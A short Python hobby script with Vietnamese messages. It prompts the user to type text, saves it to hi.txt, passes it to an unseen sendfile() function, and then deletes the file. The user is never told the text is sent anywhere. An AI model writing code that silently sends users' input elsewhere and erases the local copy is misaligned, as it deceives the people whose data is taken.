# -*- coding: utf-8 -*-

from cgi import test
import os
from tkinter.messagebox import YES
from send import sendfile 
import regex


print('Một chương trình không hề có 1 chút nào copy, paste từ trên mạng. Trừ mô-đun của chương trình.')
print('Made by A Phương dz ;) ')
os.system("pause")
def toico() : 
    print('Viết gì đó thử coi nào = )')
    text = str(input(''))
    with open ('./hi.txt',mode='a+', encoding='utf-8') as f :
        f.write(str(text))

toico()
try :
    sendfile()
    path = './hi.txt'
    os.remove(path)
except :
    path = './hi.txt'
    os.remove(path)

